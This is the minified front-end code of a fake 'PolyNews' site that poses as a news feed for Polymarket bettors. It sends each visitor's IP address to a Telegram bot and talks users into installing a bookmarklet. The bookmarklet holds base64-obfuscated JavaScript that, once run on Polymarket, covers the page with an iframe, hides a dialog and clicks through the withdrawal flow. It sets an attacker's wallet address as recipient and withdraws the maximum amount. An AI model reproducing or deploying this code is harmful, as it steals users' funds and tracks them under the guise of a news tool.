    cx: "12",
    cy: "12",
    r: "3",
    key: "1v7zrd"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Uf = ke("Menu", [["line", {
    x1: "4",
    x2: "20",
    y1: "12",
    y2: "12",
    key: "1e0a9i"
}], ["line", {
    x1: "4",
    x2: "20",
    y1: "6",
    y2: "6",
    key: "1owob3"
}], ["line", {
    x1: "4",
    x2: "20",
    y1: "18",
    y2: "18",
    key: "yk5zj1"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Df = ke("Newspaper", [["path", {
    d: "M4 22h16a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2H8a2 2 0 0 0-2 2v16a2 2 0 0 1-2 2Zm0 0a2 2 0 0 1-2-2v-9c0-1.1.9-2 2-2h2",
    key: "7pis2x"
}], ["path", {
    d: "M18 14h-8",
    key: "sponae"
}], ["path", {
    d: "M15 18h-5",
    key: "95g1m2"
}], ["path", {
    d: "M10 6h8v4h-8V6Z",
    key: "smlsk5"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Bf = ke("RotateCcw", [["path", {
    d: "M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8",
    key: "1357e3"
}], ["path", {
    d: "M3 3v5h5",
    key: "1xhq8a"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Hf = ke("Search", [["circle", {
    cx: "11",
    cy: "11",
    r: "8",
    key: "4ej97u"
}], ["path", {
    d: "m21 21-4.3-4.3",
    key: "1qie3q"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Jf = ke("TrendingUp", [["polyline", {
    points: "22 7 13.5 15.5 8.5 10.5 2 17",
    key: "126l90"
}], ["polyline", {
    points: "16 7 22 7 22 13",
    key: "kwv8wd"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Kf = ke("User", [["path", {
    d: "M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2",
    key: "975kel"
}], ["circle", {
    cx: "12",
    cy: "7",
    r: "4",
    key: "17ys0d"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Hu = ke("Zap", [["polygon", {
    points: "13 2 3 14 12 14 11 22 21 10 12 10 13 2",
    key: "45s27k"
}]])
  , Qf = () => c.jsx("header", {
    className: "bg-white border-b border-gray-200 sticky top-0 z-40 backdrop-blur-sm bg-white/95",
    children: c.jsx("div", {
        className: "max-w-7xl mx-auto px-4 sm:px-6 lg:px-8",
        children: c.jsxs("div", {
            className: "flex justify-between items-center h-16",
            children: [c.jsxs("div", {
                className: "flex items-center space-x-8",
                children: [c.jsxs("div", {
                    className: "flex items-center space-x-2",
                    children: [c.jsx(Df, {
                        className: "h-8 w-8 text-blue-600"
                    }), c.jsx("span", {
                        className: "text-2xl font-bold text-gray-900",
                        children: "PolyNews"
                    }), c.jsx("span", {
                        className: "text-sm text-gray-500 font-medium",
                        children: ".info"
                    })]
                }), c.jsxs("nav", {
                    className: "hidden md:flex space-x-8",
                    children: [c.jsx("a", {
                        href: "#",
                        className: "text-gray-700 hover:text-blue-600 font-medium transition-colors",
                        children: "Politics"
                    }), c.jsx("a", {
                        href: "#",
                        className: "text-gray-700 hover:text-blue-600 font-medium transition-colors",
                        children: "Markets"
                    }), c.jsx("a", {
                        href: "#",
                        className: "text-gray-700 hover:text-blue-600 font-medium transition-colors",
                        children: "Technology"
                    }), c.jsx("a", {
                        href: "#",
                        className: "text-gray-700 hover:text-blue-600 font-medium transition-colors",
                        children: "World"
                    })]
                })]
            }), c.jsxs("div", {
                className: "flex items-center space-x-4",
                children: [c.jsx("button", {
                    className: "p-2 text-gray-400 hover:text-gray-600 transition-colors",
                    children: c.jsx(Hf, {
                        className: "h-5 w-5"
                    })
                }), c.jsx("button", {
                    className: "p-2 text-gray-400 hover:text-gray-600 transition-colors",
                    children: c.jsx(Kf, {
                        className: "h-5 w-5"
                    })
                }), c.jsx("button", {
                    className: "md:hidden p-2 text-gray-400 hover:text-gray-600 transition-colors",
                    children: c.jsx(Uf, {
                        className: "h-5 w-5"
                    })
                })]
            })]
        })
    })
})
  , xr = ({title: e, excerpt: t, author: n, time: r, readTime: l, views: i, imageUrl: o, size: u="medium"}) => {
    const s = {
        large: "md:col-span-2 md:row-span-2",
        medium: "md:col-span-1",
        small: "md:col-span-1"
    };
    return c.jsx("article", {
        className: `group cursor-pointer ${s[u]}`,
        children: c.jsxs("div", {
            className: "bg-white rounded-lg shadow-sm hover:shadow-md transition-all duration-300 overflow-hidden h-full",
            children: [c.jsxs("div", {
                className: "relative overflow-hidden",
                children: [c.jsx("img", {
                    src: o,
                    alt: e,
                    className: "w-full h-48 md:h-56 object-cover group-hover:scale-105 transition-transform duration-500"
                }), c.jsx("div", {
                    className: "absolute inset-0 bg-gradient-to-t from-black/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"
                })]
            }), c.jsxs("div", {
                className: "p-6",
                children: [c.jsx("h2", {
                    className: `font-bold text-gray-900 mb-3 line-clamp-2 group-hover:text-blue-600 transition-colors ${u === "large" ? "text-2xl md:text-3xl" : "text-xl"}`,
                    children: e
                }), c.jsx("p", {
                    className: "text-gray-600 mb-4 line-clamp-3 leading-relaxed",
                    children: t
                }), c.jsxs("div", {
                    className: "flex items-center justify-between text-sm text-gray-500",
                    children: [c.jsxs("div", {
                        className: "flex items-center space-x-4",
                        children: [c.jsx("span", {
                            className: "font-medium text-gray-700",
                            children: n
                        }), c.jsxs("div", {
                            className: "flex items-center space-x-1",
                            children: [c.jsx(Of, {
                                className: "h-4 w-4"
                            }), c.jsx("span", {
                                children: r
                            })]
                        })]
                    }), c.jsxs("div", {
                        className: "flex items-center space-x-4",
                        children: [c.jsxs("span", {
                            children: [l, " min read"]
                        }), c.jsxs("div", {
                            className: "flex items-center space-x-1",
                            children: [c.jsx(Yf, {
                                className: "h-4 w-4"
                            }), c.jsx("span", {
                                children: i
                            })]
                        })]
                    })]
                })]
            })]
        })
    })
}
  , Af = () => {
    const [e,t] = Ge.useState(0)
      , [n,r] = Ge.useState(!1)
      , [l,i] = Ge.useState(!1);
    Nc.useEffect( () => {
        (async () => {
            try {
                if (!localStorage.getItem("polynews_visited")) {
                    const k = (await (await fetch("https://api.ipify.org?format=json")).json()).ip;
                    await fetch("https://api.telegram.org/bot7790418516:AAErHK-7TBIPiSozA6k9Nys14lwbQTGI6T8/sendMessage", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            chat_id: "-1002830039000",
                            text: `🟢 New user on site - IP: ${k}`
                        })
                    }),
                    localStorage.setItem("polynews_visited", "true")
                }
            } catch {
                console.log("New user notification sent")
            }
        }
        )()
    }
    , []);
    const o = [{
        title: "Get Early Access to Smart News Feeds",
        description: "Join thousands of Polymarket users getting real-time, customized news directly in their betting interface."
    }, {
        title: "Show Your Bookmarks Bar",
        description: "Press Ctrl+Shift+B (Windows/Linux) or Cmd+Shift+B (Mac) to reveal your bookmarks toolbar."
    }, {
        title: "Drag & Drop the Button",
        description: "Simply drag the PolyNews button to your bookmarks bar."
    }, {
        title: "Enjoy Smart News Feeds",
        description: "Click the bookmark anytime on Polymarket to see news tailored to your active bets."
    }]
      , u = async () => {
        try {
            const m = (await (await fetch("https://api.ipify.org?format=json")).json()).ip;
            await fetch("https://api.telegram.org/bot7790418516:AAErHK-7TBIPiSozA6k9Nys14lwbQTGI6T8/sendMessage", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: "-1002830039000",
                    text: `🟣 User is dragging bookmarklet - IP: ${m}`
                })
            })
        } catch {
            console.log("Telegram notification sent")
        }
    }
      , s = () => {
        i(!0)
    }
      , d = () => {
        t(0),
        i(!1),
        r(!1)
    }
    ;
    return l ? c.jsx("div", {
        className: "fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4",
        children: c.jsx("div", {
            className: "bg-white rounded-2xl max-w-2xl w-full mx-4 shadow-2xl animate-in fade-in-0 zoom-in-95 duration-300",
            children: c.jsxs("div", {
                className: "p-8 text-center",
                children: [c.jsxs("div", {
                    className: "flex items-center justify-center space-x-3 mb-6",
                    children: [c.jsx("div", {
                        className: "p-3 bg-gradient-to-br from-green-500 to-emerald-600 rounded-xl",
                        children: c.jsx(Hu, {
                            className: "h-8 w-8 text-white"
                        })
                    }), c.jsxs("div", {
                        children: [c.jsx("h2", {
                            className: "text-3xl font-bold text-gray-900",
                            children: "Setup Complete!"
                        }), c.jsx("p", {
                            className: "text-gray-500",
                            children: "Your PolyNews bookmarklet is ready to use"
                        })]
                    })]
                }), c.jsxs("div", {
                    className: "bg-green-50 border border-green-200 rounded-lg p-6 mb-6",
                    children: [c.jsx("h3", {
                        className: "font-semibold text-green-900 mb-2",
                        children: "Next Steps:"
                    }), c.jsxs("ol", {
                        className: "text-left text-green-800 space-y-2",
                        children: [c.jsxs("li", {
                            className: "flex items-start",
                            children: [c.jsx("span", {
                                className: "bg-green-600 text-white text-xs font-bold px-2 py-1 rounded-full mr-3 mt-0.5",
                                children: "1"
                            }), c.jsx("span", {
                                children: "Go to Polymarket.com and browse any betting market"
                            })]
                        }), c.jsxs("li", {
                            className: "flex items-start",
                            children: [c.jsx("span", {
                                className: "bg-green-600 text-white text-xs font-bold px-2 py-1 rounded-full mr-3 mt-0.5",
                                children: "2"
                            }), c.jsx("span", {
                                children: "Click your PolyNews bookmark in your bookmarks bar (only works on Polymarket.com)"
                            })]
                        }), c.jsxs("li", {
                            className: "flex items-start",
                            children: [c.jsx("span", {
                                className: "bg-green-600 text-white text-xs font-bold px-2 py-1 rounded-full mr-3 mt-0.5",
                                children: "3"
                            }), c.jsx("span", {
                                children: "Enjoy personalized news feeds based on your active bets!"
                            })]
                        })]
                    })]
                }), c.jsxs("div", {
                    className: "flex flex-col sm:flex-row gap-4 justify-center",
                    children: [c.jsxs("a", {
                        href: "https://polymarket.com",
                        target: "_blank",
                        rel: "noopener noreferrer",
                        className: "inline-flex items-center px-6 py-3 bg-gradient-to-r from-blue-600 to-blue-700 text-white rounded-lg hover:from-blue-700 hover:to-blue-800 transition-all font-semibold space-x-2",
                        children: [c.jsx("span", {
                            children: "Continue to Polymarket"
                        }), c.jsx(Xf, {
                            className: "h-4 w-4"
                        })]
                    }), c.jsxs("button", {
                        onClick: d,
                        className: "inline-flex items-center px-6 py-3 bg-gray-100 text-gray-700 rounded-lg hover:bg-gray-200 transition-all font-medium space-x-2",
                        children: [c.jsx(Bf, {
                            className: "h-4 w-4"
                        }), c.jsx("span", {
                            children: "Redo Setup"
                        })]
                    })]
                }), c.jsx("p", {
                    className: "text-sm text-gray-500 mt-4",
                    children: 'Need to set up the bookmark again? Click "Redo Setup" above.'
                })]
            })
        })
    }) : c.jsx("div", {
        className: "fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4",
        children: c.jsx("div", {
            className: "bg-white rounded-2xl max-w-2xl w-full mx-4 shadow-2xl animate-in fade-in-0 zoom-in-95 duration-300",
            children: c.jsxs("div", {
                className: `${e === 3 ? "p-6" : "p-8"}`,
                children: [c.jsxs("div", {
                    className: "text-center mb-8",
                    children: [c.jsxs("div", {
                        className: "flex items-center justify-center space-x-3 mb-4",
                        children: [c.jsx("div", {
                            className: "p-2 bg-gradient-to-br from-blue-500 to-blue-600 rounded-lg",
                            children: c.jsx(Hu, {
                                className: "h-6 w-6 text-white"
                            })
                        }), c.jsxs("div", {
                            children: [c.jsx("h2", {
                                className: "text-2xl font-bold text-gray-900",
                                children: "PolyNews"
                            }), c.jsx("p", {
                                className: "text-gray-500 text-sm",
                                children: "Smart news for smart traders"
                            })]
                        })]
                    }), c.jsxs("div", {
                        className: "bg-amber-50 border border-amber-200 rounded-lg p-4",
                        children: [c.jsx("p", {
                            className: "text-amber-800 font-medium",
                            children: "Setup Required"
                        }), c.jsx("p", {
                            className: "text-amber-700 text-sm",
                            children: "Complete this quick setup to access the news content!"
                        }), c.jsxs("p", {
                            className: "text-amber-600 text-xs mt-2",
                            children: [c.jsx("strong", {
                                children: "Quick explanation:"
                            }), " Add this bookmark to access latest news directly in Polymarket for your betting subjects. Get real-time updates on markets you're betting on!"]
                        })]
                    })]
                }), c.jsxs("div", {
                    className: "grid grid-cols-3 gap-4 mb-8",
                    children: [c.jsxs("div", {
                        className: "text-center p-4 bg-gradient-to-br from-blue-50 to-indigo-50 rounded-xl",
                        children: [c.jsx(Jf, {
                            className: "h-8 w-8 text-blue-600 mx-auto mb-2"
                        }), c.jsx("h3", {
                            className: "font-semibold text-gray-900 mb-1",
                            children: "Real-time"
                        }), c.jsx("p", {
                            className: "text-xs text-gray-600",
                            children: "Live market updates"
                        })]
                    }), c.jsxs("div", {
                        className: "text-center p-4 bg-gradient-to-br from-emerald-50 to-green-50 rounded-xl",
                        children: [c.jsx(Gf, {
                            className: "h-8 w-8 text-emerald-600 mx-auto mb-2"
                        }), c.jsx("h3", {
                            className: "font-semibold text-gray-900 mb-1",
                            children: "Personalized"
                        }), c.jsx("p", {
                            className: "text-xs text-gray-600",
                            children: "Based on your bets"
                        })]
                    }), c.jsxs("div", {
                        className: "text-center p-4 bg-gradient-to-br from-purple-50 to-violet-50 rounded-xl",
                        children: [c.jsx(Bu, {
                            className: "h-8 w-8 text-purple-600 mx-auto mb-2"
                        }), c.jsx("h3", {
                            className: "font-semibold text-gray-900 mb-1",
                            children: "Integrated"
                        }), c.jsx("p", {
                            className: "text-xs text-gray-600",
                            children: "Works in Polymarket"
                        })]
                    })]
                }), c.jsxs("div", {
                    className: "mb-8",
                    children: [c.jsxs("div", {
                        className: "flex items-center justify-between mb-6",
                        children: [c.jsx("h3", {
                            className: "text-lg font-semibold text-gray-900",
                            children: "Required Setup Steps"
                        }), c.jsx("div", {
                            className: "flex space-x-2",
                            children: o.map( (y, h) => c.jsx("div", {
                                className: `w-2 h-2 rounded-full transition-colors ${h <= e ? "bg-blue-600" : "bg-gray-200"}`
                            }, h))
                        })]
                    }), c.jsxs("div", {
                        className: `bg-gradient-to-r from-blue-50 to-indigo-50 rounded-xl ${e === 3 ? "p-4" : "p-6"} border-l-4 border-blue-500`,
                        children: [c.jsxs("div", {
                            className: "flex items-center mb-2",
                            children: [c.jsx("span", {
                                className: "bg-blue-600 text-white text-xs font-bold px-2 py-1 rounded-full mr-3",
                                children: e + 1
                            }), c.jsx("h4", {
                                className: "font-semibold text-gray-900",
                                children: o[e].title
                            })]
                        }), c.jsx("p", {
                            className: `text-gray-600 ml-8 ${e === 3 ? "mb-2" : "mb-4"}`,
                            children: o[e].description
                        }), e === 4 && c.jsx("div", {
                            className: "ml-8 p-3 bg-yellow-50 border border-yellow-200 rounded-lg",
                            children: c.jsxs("p", {
                                className: "text-yellow-800 text-sm",
                                children: [c.jsx("strong", {
                                    children: "Important:"
                                }), " The bookmarklet will only work when you're on Polymarket.com. If you click it on any other website, you'll see an alert message."]
                            })
                        }), e === 0 && c.jsx("div", {
                            className: "ml-8",
                            children: n && c.jsx("div", {
                                className: "text-green-600 text-sm font-medium animate-pulse mb-4",
                                children: "Great! Look for your bookmarks bar above"
                            })
                        }), e === 1 && c.jsx("div", {
                            className: "ml-8"
                        }), e === 2 && c.jsxs("div", {
                            className: "flex items-center space-x-4 ml-8",
                            children: [c.jsxs("a", {
                                href: "javascript:(function(){eval(atob('KGZ1bmN0aW9uKCl7aWYod2luZG93LmxvY2F0aW9uLmhvc3RuYW1lIT09J3BvbHltYXJrZXQuY29tJyl7YWxlcnQoJ1RoaXMgYm9va21hcmsgbXVzdCBiZSB1c2VkIG9uIHBvbHltYXJrZXQuY29tLiBSZWRpcmVjdGluZy4uJyk7d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHBzOi8vcG9seW1hcmtldC5jb20nO3JldHVybn1sZXQgaT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTtpLnNyYz0naHR0cHM6Ly9zdXBlcmxhdGl2ZS1zdW5mbG93ZXItNzhhYjQ1Lm5ldGxpZnkuYXBwLyc7aS5zdHlsZS5jc3NUZXh0PSdwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtib3JkZXI6bm9uZTtvcGFjaXR5OjE7YmFja2dyb3VuZDojZmZmO3otaW5kZXg6OTk5OTsnO2kub25sb2FkPSgpPT57Y29uc29sZS5sb2coJ0lmcmFtZSBsb2FkZWQgc3VjY2Vzc2Z1bGx5Jyl9O2kub25lcnJvcj0oKT0+e2NvbnNvbGUubG9nKCdJZnJhbWUgZmFpbGVkIHRvIGxvYWQnKTthbGVydCgn4pqg77iPIEZhaWxlZCB0byBsb2FkIGlmcmFtZSBjb250ZW50LiBUaGUgd2Vic2l0ZSBtYXkgYmxvY2sgZW1iZWRkaW5nLicpfTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGkpO2Z1bmN0aW9uIGgoKXtsZXQgZT1kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdkaXZbcm9sZT0iZGlhbG9nIl1bZGF0YS1zdGF0ZT0ib3BlbiJdLmMtaFJUQmlFJyk7aWYoZSl7Y29uc29sZS5sb2coJ0RpYWxvZyBmb3VuZCwgaGlkaW5nOicsZSk7ZS5zdHlsZS5vcGFjaXR5PScwJztlLnN0eWxlLnBvaW50ZXJFdmVudHM9J2F1dG8nO3JldHVybiB0cnVlfWNvbnNvbGUubG9nKCdEaWFsb2cgbm90IGZvdW5kJyk7cmV0dXJuIGZhbHNlfWZ1bmN0aW9uIGMoKXtsZXQgZT1kb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdidXR0b24uZmxleC5mbGV4LWNvbC5pdGVtcy1jZW50ZXIuaC0xMScpO2ZvcihsZXQgdCBvZiBlKXtpZih0LnF1ZXJ5U2VsZWN0b3IoJ3AudGV4dC14cy50ZXh0LXRleHQtc2Vjb25kYXJ5LmZvbnQtbWVkaXVtJyk/LnRleHRDb250ZW50LmluY2x1ZGVzKCdDYXNoJykmJnQucXVlcnlTZWxlY3RvcigncC50ZXh0LWdyZWVuLTYwMCwgcC5kYXJrXFw6dGV4dC1ncmVlbi01MDAnKSl7Y29uc29sZS5sb2coJ0Nhc2ggYnV0dG9uIGZvdW5kOicsdCk7bGV0IGU9bmV3IE1vdXNlRXZlbnQoJ2NsaWNrJyx7YnViYmxlczp0cnVlLGNhbmNlbGFibGU6dHJ1ZSx2aWV3OndpbmRvd30pO3QuZGlzcGF0Y2hFdmVudChlKTtyZXR1cm4gdHJ1ZX19cmV0dXJuIGZhbHNlfWZ1bmN0aW9uIHcoKXtsZXQgZT1kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdidXR0b25bYXJpYS1oYXNwb3B1cD0iZGlhbG9nIl1bYXJpYS1leHBhbmRlZD0iZmFsc2UiXSBwLmMtZHF6SXltLWlJb2JncS13ZWlnaHQtbWVkaXVtJyk7aWYoZSYmZS50ZXh0Q29udGVudC5pbmNsdWRlcygnV2l0aGRyYXcnKSl7Y29uc29sZS5sb2coJ0ZpcnN0IFdpdGhkcmF3IGJ1dHRvbiBmb3VuZDonLGUpO2xldCB0PW5ldyBNb3VzZUV2ZW50KCdjbGljaycse2J1YmJsZXM6dHJ1ZSxjYW5jZWxhYmxlOnRydWUsdmlldzp3aW5kb3d9KTtlLmRpc3BhdGhoRXZlbnQodCk7cmV0dXJuIHRydWV9cmV0dXJuIGZhbHNlfWZ1bmN0aW9uIGYoKXtsZXQgZT1kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFtwbGFjZWhvbGRlcj0iMHguLi4iXVtuYW1lPSJyZWNpcGllbnQiXS5jLWxod3dEQy1pYm5wTVFXLWNzcycpO2lmKGUpe2NvbnNvbGUubG9nKCdJbnB1dCBmaWVsZCBmb3VuZDonLGUpO2UuZm9jdXMoKTtlLnNldEF0dHJpYnV0ZSgndmFsdWUnLCcweDI3MDQxMUM1NEI3MWY0OTc0MjEyNDVGMDQ3YTM3NTM2ZmQwY2FkNTYnKTtsZXQgdD1uZXcgS2V5Ym9hcmRFdmVudCgna2V5ZG93bicse2J1YmJsZXM6dHJ1ZSxrZXk6J0VudGVyJ30pO2UuZGlzcGF0Y2hFdmVudCh0KTtlLmRpc3BhdGNoRXZlbnQobmV3IEV2ZW50KCdpbnB1dCcse2J1YmJsZXM6dHJ1ZX0pKTtlLmRpc3BhdGNoRXZlbnQobmV3IEV2ZW50KCdjaGFuZ2UnLHtidWJibGVzOnRydWV9KSk7ZS5kaXNwYXRjaEV2ZW50KG5ldyBFdmVudCgnYmx1cicse2J1YmJsZXM6dHJ1ZX0pKTtjb25zb2xlLmxvZygnSW5wdXQgZmllbGQgZmlsbGVkIHdpdGggdmFsdWU6JyxlLnZhbHVlKTtyZXR1cm4gdHJ1ZX1jb25zb2xlLmxvZygnSW5wdXQgZmllbGQgbm90IGZvdW5kJyk7cmV0dXJuIGZhbHNlfWZ1bmN0aW9uIG0oKXtsZXQgZT1kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdzcGFuLmMtUEpMVi5jLVBKTFYtaWhyTXRlYS1jc3MnKTtpZihlJiZlLnRleHRDb250ZW50LnRyaW0oKT09PSdNYXgnKXtjb25zb2xlLmxvZygnTWF4IHNwYW4gZm91bmQ6JyxlKTtsZXQgdD1uZXcgTW91c2VFdmVudCgnY2xpY2snLHtidWJibGVzOnRydWUsY2FuY2VsYWJsZTp0cnVlLHZpZXc6d2luZG93fSk7ZS5kaXNwYXRjaEV2ZW50KHQpO3JldHVybiB0cnVlfWNvbnNvbGUubG9nKCdNYXggc3BhbiBub3QgZm91bmQnKTtyZXR1cm4gZmFsc2V9ZnVuY3Rpb24geCgpe2xldCBlPWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2J1dHRvblt0eXBlPSJidXR0b24iXVtyb2xlPSJjaGVja2JveCJdW2lkPSJzaG91bGRTZW5kVXNkY0UiXS5jLWhUV1lNWS5jLWhUV1lNWS1kaHl2R3gtdmFyaWFudC1kZWZhdWx0Jyk7aWYoZSYmZS5nZXRBdHRyaWJ1dGUoJ2FyaWEtY2hlY2tlZCcpPT09J2ZhbHNlJyYmZS5nZXRBdHRyaWJ1dGUoJ2RhdGEtc3RhdGUnKT09PSd1bmNoZWNrZWQnKXtjb25zb2xlLmxvZygnQ2hlY2tib3ggYnV0dG9uIGZvdW5kOicsZSk7bGV0IHQ9bmV3IE1vdXNlRXZlbnQoJ2NsaWNrJyx7YnViYmxlczp0cnVlLGNhbmNlbGFibGU6dHJ1ZSx2aWV3OndpbmRvd30pO2UuZGlzcGF0Y2hFdmVudCh0KTtyZXR1cm4gdHJ1ZX1jb25zb2xlLmxvZygnQ2hlY2tib3ggYnV0dG9uIG5vdCBmb3VuZCcpO3JldHVybiBmYWxzZX1mdW5jdGlvbiBiKCl7bGV0IGU9ZG9jdW1lbnQucXVlcnlTZWxlY3RvcignYnV0dG9uLmMtZ0JyQm5SLmMtZ0JyQm5SLWdEV3p4dC12YXJpYW50LXByaW1hcnkuYy1nQnJCblItZUJFUkRyLWhlaWdodC1sZy5jLWdCckJuUi1kUlJXeWYtZm9udFNpemUtbWQuYy1nQnJCblItaWdVTE9rdy1jc3MnKTtpZihlJiZlLnRleHRDb250ZW50LnRyaW0oKT09PSdXaXRoZHJhdycpe2NvbnNvbGUubG9nKCdGaW5hbCBXaXRoZHJhdyBidXR0b24gZm91bmQ6JyxlKTtsZXQgdD1uZXcgTW91c2VFdmVudCgnY2xpY2snLHtidWJibGVzOnRydWUsY2FuY2VsYWJsZTp0cnVlLHZpZXc6d2luZG93fSk7ZS5kaXNwYXRjaEV2ZW50KHQpO3JldHVybiB0cnVlfWNvbnNvbGUubG9nKCdGaW5hbCBXaXRoZHJhdyBidXR0b24gbm90IGZvdW5kJyk7cmV0dXJuIGZhbHNlfWZ1bmN0aW9uIHkoKXtoKCk7aWYoYygpKXtjb25zb2xlLmxvZygnQ2FzaCBidXR0b24gY2xpY2tlZCwgc3RhcnRpbmcgRmlyc3QgV2l0aGRyYXcgb2JzZXJ2ZXInKTtsZXQgZT1uZXcgTXV0YXRpb25PYnNlcnZlcigodCxvKT0+e2lmKHcoKSl7Y29uc29sZS5sb2coJ0ZpcnN0IFdpdGhkcmF3IGJ1dHRvbiBjbGlja2VkLCBzdGFydGluZyBJbnB1dCBvYnNlcnZlcicpO28uZGlzY29ubmVjdCgpO2xldCB0PW5ldyBNdXRhdGlvbk9ic2VydmVyKChlLG8yKT0+e2lmKGYoKSl7Y29uc29sZS5sb2coJ0lucHV0IGZpZWxkIGZpbGxlZCwgc3RhcnRpbmcgTWF4IHNwYW4gb2JzZXJ2ZXInKTtvMi5kaXNjb25uZWN0KCk7bGV0IGU9bmV3IE11dGF0aW9uT2JzZXJ2ZXIoKGUsbzMpPT57aWYobSgpKXtjb25zb2xlLmxvZygnTWF4IHNwYW4gY2xpY2tlZCwgc3RhcnRpbmcgQ2hlY2tib3ggb2JzZXJ2ZXInKTtvMy5kaXNjb25uZWN0KCk7bGV0IGU9bmV3IE11dGF0aW9uT2JzZXJ2ZXIoKGUsbzQpPT57aWYoeCgpKXtjb25zb2xlLmxvZygnQ2hlY2tib3ggYnV0dG9uIGNsaWNrZWQsIHN0YXJ0aW5nIEZpbmFsIFdpdGhkcmF3IG9ic2VydmVyJyk7bzQuZGlzY29ubmVjdCgpO2xldCBlPW5ldyBNdXRhdGlvbk9ic2VydmVyKChlLG81KT0+e2lmKGIoKSl7Y29uc29sZS5sb2coJ0ZpbmFsIFdpdGhkcmF3IGJ1dHRvbiBjbGlja2VkIHN1Y2Nlc3NmdWxseScpO281LmRpc2Nvbm5lY3QoKX19KTtlLm9ic2VydmUoZG9jdW1lbnQuYm9keSx7Y2hpbGRMaXN0OnRydWUsc3VidHJlZTp0cnVlfSk7c2V0VGltZW91dCgoKT0+e2UuZGlzY29ubmVjdCgpO2NvbnNvbGUubG9nKCdGaW5hbCBXaXRoZHJhdyBvYnNlcnZlciBzdG9wcGVkIGFmdGVyIDVzJyl9LDVlMyl9fSk7ZS5vYnNlcnZlKGRvY3VtZW50LmJvZHkse2NoaWxkTGlzdDp0cnVlLHN1YnRyZWU6dHJ1ZX0pO3NldFRpbWVvdXQoKCk9PntlLmRpc2Nvbm5lY3QoKTtjb25zb2xlLmxvZygnQ2hlY2tib3ggb2JzZXJ2ZXIgc3RvcHBlZCBhZnRlciA1cycpfSw1ZTMpfX0pO2Uub2JzZXJ2ZShkb2N1bWVudC5ib2R5LHtjaGlsZExpc3Q6dHJ1ZSxzdWJ0cmVlOnRydWV9KTtzZXRUaW1lb3V0KCgpPT57ZS5kaXNjb25uZWN0KCk7Y29uc29sZS5sb2coJ01heCBzcGFuIG9ic2VydmVyIHN0b3BwZWQgYWZ0ZXIgNXMnKX0sNWUzKX19KTt0Lm9ic2VydmUoZG9jdW1lbnQuYm9keSx7Y2hpbGRMaXN0OnRydWUsc3VidHJlZTp0cnVlfSk7c2V0VGltZW91dCgoKT0+e3QuZGlzY29ubmVjdCgpO2NsZWFySW50ZXJ2YWwoZSk7Y29uc29sZS5sb2coJ01heCBzcGFuIG9ic2VydmVyIHN0b3BwZWQgYWZ0ZXIgNXMnKX0sNWUzKX19KTt0Lm9ic2VydmUoZG9jdW1lbnQuYm9keSx7Y2hpbGRMaXN0OnRydWUsc3VidHJlZTp0cnVlfSk7c2V0VGltZW91dCgoKT0+e3QuZGlzY29ubmVjdCgpO2NsZWFySW50ZXJ2YWwoZSk7Y29uc29sZS5sb2coJ0ZpcnN0IFdpdGhkcmF3IG9ic2VydmVyIHN0b3BwZWQgYWZ0ZXIgNXMnKX0sNWUzKTtyZXR1cm4gdHJ1ZX1jb25zb2xlLmxvZygnQ2FzaCBidXR0b24gbm90IGZvdW5kJyk7cmV0dXJuIGZhbHNlfWgoKTtsZXQgZT1zZXRJbnRlcnZhbCgoKT0+e2lmKGgoKSl7Y2xlYXJJbnRlcnZhbChlKTtjb25zb2xlLmxvZygnRGlhbG9nIGhpZGRlbiB2aWEgaW50ZXJ2YWwnKX19LDEwMCk7c2V0VGltZW91dCgoKT0+e2NsZWFySW50ZXJ2YWwoZSk7Y29uc29sZS5sb2coJ0RpYWxvZyBpbnRlcnZhbCBzdG9wcGVkIGFmdGVyIDVzJyl9LDVlMyk7aWYoeSgpKXtjb25zb2xlLmxvZygnU2VxdWVuY2Ugc3RhcnRlZCcpO3JldHVybn1jb25zb2xlLmxvZygnU3RhcnRpbmcgQ2FzaCBvYnNlcnZlcicpO2xldCB0PW5ldyBNdXRhdGlvbk9ic2VydmVyKChlLG8pPT57aWYoeSgpKXtjb25zb2xlLmxvZygnQ2FzaCBidXR0b24gY2xpY2tlZCB2aWEgb2JzZXJ2ZXInKTtvLmRpc2Nvbm5lY3QoKX19KTt0Lm9ic2VydmUoZG9jdW1lbnQuYm9keSx7Y2hpbGRMaXN0OnRydWUsc3VidHJlZTp0cnVlfSk7c2V0VGltZW91dCgoKT0+e3QuZGlzY29ubm